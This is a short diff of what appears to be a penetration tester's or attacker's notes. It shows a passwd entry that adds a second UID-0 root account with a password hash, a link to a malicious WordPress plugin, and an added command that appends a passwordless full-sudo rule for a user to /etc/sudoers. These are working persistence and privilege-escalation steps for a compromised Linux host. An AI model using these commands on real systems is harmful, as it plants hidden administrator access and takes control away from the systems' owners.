@@ -140,3 +140,4 @@ infosec:$1$aMyu0OrN$xq9uJWWly7Nfy43bofl6U1:0:0:root:/root:/bin/bash
 Netdiscover
 
 wordpress plugin: https://github.com/wetw0rk/malicious-wordpress-plugin
+echo "useradm        ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
